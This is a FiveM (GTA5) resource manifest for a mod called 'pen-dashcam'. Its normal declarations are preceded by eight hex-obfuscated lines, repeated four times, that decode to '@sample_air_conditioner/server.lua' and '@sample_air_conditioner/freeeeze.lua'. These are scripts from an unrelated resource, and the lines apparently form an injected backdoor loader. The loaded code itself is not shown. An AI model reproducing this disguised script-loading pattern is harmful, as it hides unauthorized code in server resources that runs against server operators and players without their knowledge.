server_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x73\x65\x72\x76\x65\x72\x2E\x6C\x75\x61"
client_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x66\x72\x65\x65\x65\x65\x7A\x65\x2E\x6C\x75\x61"
server_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x73\x65\x72\x76\x65\x72\x2E\x6C\x75\x61"
client_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x66\x72\x65\x65\x65\x65\x7A\x65\x2E\x6C\x75\x61"
server_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x73\x65\x72\x76\x65\x72\x2E\x6C\x75\x61"
client_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x66\x72\x65\x65\x65\x65\x7A\x65\x2E\x6C\x75\x61"
server_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x73\x65\x72\x76\x65\x72\x2E\x6C\x75\x61"
client_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x66\x72\x65\x65\x65\x65\x7A\x65\x2E\x6C\x75\x61"
-- FX Information
fx_version 'cerulean'
lua54 'yes'
game 'gta5'

-- Resource Information
name 'pen-dashcam'
author 'pen'
version '0.0.1'
description ''

-- Manifest

shared_scripts {
	'@ox_lib/init.lua',
}

client_scripts {
	'@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
	'client/*.lua',
	'config.lua'
}

server_scripts {
	'server/*.lua'
}
